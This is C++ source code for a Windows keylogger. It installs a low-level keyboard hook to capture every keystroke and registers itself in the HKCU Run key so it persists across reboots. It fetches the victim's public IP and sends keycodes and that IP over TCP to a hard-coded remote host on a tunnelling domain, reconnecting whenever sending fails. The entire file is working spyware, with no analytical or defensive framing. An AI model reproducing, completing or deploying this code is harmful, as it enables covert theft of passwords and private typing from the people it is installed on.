#include <iostream>
#include <winsock2.h>
#include <ws2tcpip.h>

#include "windows.h"
#include <thread>
#include <mutex>
#include <queue>
#include <string>
#include <atomic>
#include <chrono>
#include <string>

#include <winhttp.h>
// #include <netdb.h>
#include <unistd.h>

using namespace std;

// string server_ip = "127.0.0.1";
// int server_port = 8080;

string server_ip = "u07i3ow4yj.localto.net";
int server_port = 7069;

HHOOK hook;
SOCKET server;
thread networkThread;

std::queue<std::string> networkMessages;
std::mutex messagesMutex;
std::atomic<bool> running = true;
#pragma comment(lib, "winhttp.lib")

std::string getPublicIP() {
    HINTERNET session = WinHttpOpen(
        L"MyApplication",
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        NULL, NULL, 0
    );

    if (!session) return "";

    HINTERNET connection = WinHttpConnect(
        session,
        L"api.ipify.org",
        INTERNET_DEFAULT_HTTPS_PORT,
        0
    );

    if (!connection) {
        WinHttpCloseHandle(session);
        return "";
    }

    HINTERNET request = WinHttpOpenRequest(
        connection,
        L"GET",
        L"/",
        NULL, NULL, NULL,
        WINHTTP_FLAG_SECURE
    );

    std::string result;

    if (request &&
        WinHttpSendRequest(request, NULL, 0, NULL, 0, 0, 0) &&
        WinHttpReceiveResponse(request, NULL)) {

        DWORD available = 0;

        while (WinHttpQueryDataAvailable(request, &available)
               && available > 0) {
            char buffer[256];
            DWORD downloaded = 0;

            if (!WinHttpReadData(
                request, buffer,
                min(available, (DWORD)sizeof(buffer)),
                &downloaded
            )) break;

            result.append(buffer, downloaded);
        }
    }

    if (request) WinHttpCloseHandle(request);
    WinHttpCloseHandle(connection);
    WinHttpCloseHandle(session);

    return result;
}
SOCKET connectServer() {
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) return 1;

    SOCKET clientSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (clientSocket == INVALID_SOCKET) {
        WSACleanup();
        return 1;
    }

    // sockaddr_in serverAddress{};
    // serverAddress.sin_family = AF_INET;
    // serverAddress.sin_port = htons(server_port);
    // inet_pton(AF_INET, server_ip.c_str(), &serverAddress.sin_addr);

    // // 4. Подключение к серверу
    // if (connect(clientSocket, (struct sockaddr*)&serverAddress, sizeof(serverAddress)) == SOCKET_ERROR) {
    //     std::cerr << "Couldn't connect to server" << std::endl;
    //     closesocket(clientSocket);
    //     WSACleanup();
    //     return 1;
    // }

    struct addrinfo hints, *res;
    memset(&hints, 0, sizeof(hints));
    hints.ai_family = AF_UNSPEC;     // Allow IPv4 (AF_INET) or IPv6 (AF_INET6)
    hints.ai_socktype = SOCK_STREAM; // TCP stream sockets

    // 3. Resolve the hostname (DNS lookup)
    int status = getaddrinfo(server_ip.c_str(), to_string(server_port).c_str(), &hints, &res);
    if (status != 0) {
        std::cerr << "getaddrinfo error: " << gai_strerror(status) << std::endl;
        return 1;
    } else
        connect(clientSocket, res->ai_addr, res->ai_addrlen);

    cout << "Successfully connected to: " << res->ai_addr << endl;

    return clientSocket;
}
void queueMessage(const std::string& message);
int sendMessage(const char* message) {
    int result = send(
        server,
        message,
        static_cast<int>(strlen(message)),
        0
    );

    if (result == SOCKET_ERROR) {
        std::cerr << "Send failed: "
                  << WSAGetLastError() << std::endl;
        while ((server = connectServer()) == 1) {
            Sleep(1000);
        }
        string ip = getPublicIP();
        queueMessage("ip"+ip);
        Sleep(20);
        queueMessage(message);
    }

    return result;
}
void networkWorker() {
    while (running) {
        std::string message;
        {
            std::lock_guard<std::mutex> lock(messagesMutex);

            if (!networkMessages.empty()) {
                message = networkMessages.front();
                networkMessages.pop();
            }
        }

        if (!message.empty())
            sendMessage(message.c_str());
        else {
            std::this_thread::sleep_for(
                std::chrono::milliseconds(10)
            );
        }
    }
}

void queueMessage(const std::string& message) {
    std::lock_guard<std::mutex> lock(messagesMutex);
    networkMessages.push(message);
}
LRESULT CALLBACK KeyboardProc(
    int nCode,
    WPARAM wParam,
    LPARAM lParam
) {
    if (nCode == HC_ACTION) {
        KBDLLHOOKSTRUCT* key =
            reinterpret_cast<KBDLLHOOKSTRUCT*>(lParam);

        if (wParam == WM_KEYDOWN) {
            // std::cout << "Key pressed: "
            //           << key->vkCode << std::endl;
            queueMessage(to_string(key->vkCode));
        }
    }

    return CallNextHookEx(
        hook, nCode, wParam, lParam
    );
}

bool AddToStartup(const std::wstring& appName) {
    wchar_t exePath[MAX_PATH];
    if (GetModuleFileNameW(NULL, exePath, MAX_PATH) == 0) {
        std::wcerr << L"Failed to get app path. Error: " << GetLastError() << std::endl;
        return false;
    }

    // 2. Открываем ключ реестра автозагрузки для текущего пользователя
    HKEY hKey;
    LPCWSTR registryPath = L"Software\\Microsoft\\Windows\\CurrentVersion\\Run";
    
    LONG result = RegOpenKeyExW(
        HKEY_CURRENT_USER, // Контекст текущего пользователя (не требует прав админа)
        registryPath, 
        0, 
        KEY_WRITE,         // Запрашиваем права на запись
        &hKey
    );

    if (result != ERROR_SUCCESS) {
        std::wcerr << L"Failed to open register key. Code: " << result << std::endl;
        return false;
    }

    // 3. Записываем значение (Имя параметра и путь к файлу)
    // Размер данных рассчитывается в байтах, включая завершающий нулевой символ
    DWORD dataSize = (lstrlenW(exePath) + 1) * sizeof(wchar_t);
    
    result = RegSetValueExW(
        hKey, 
        appName.c_str(), 
        0, 
        REG_SZ,            // Тип данных: строка (String)
        (const BYTE*)exePath, 
        dataSize
    );

    // 4. Закрываем дескриптор ключа реестра
    RegCloseKey(hKey);

    if (result != ERROR_SUCCESS) {
        std::wcerr << L"Failed to write value into register. Code: " << result << std::endl;
        return false;
    }

    return true;
}

int main(int argc, char* argv[]) {
    cout << "Start" << endl;

    if (argc > 1) {
        server_ip = argv[1];
    }
    if (argc > 2) {
        server_port = stoi(argv[2]);
    }

    char* appname = argv[0];
    std::wstring wappname(appname, appname + strlen(appname));
    AddToStartup(wappname);

    hook = SetWindowsHookExA(
        WH_KEYBOARD_LL,
        KeyboardProc,
        GetModuleHandleA(NULL),
        0
    );

    server = connectServer();
    std::thread networkThread(networkWorker);
    cout << "Network thread started" << endl;
    
    string ip = getPublicIP();
    queueMessage("ip"+ip);
    Sleep(20);

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    
    // closesocket(server);
    // WSACleanup();
    UnhookWindowsHookEx(hook);
    return 0;
}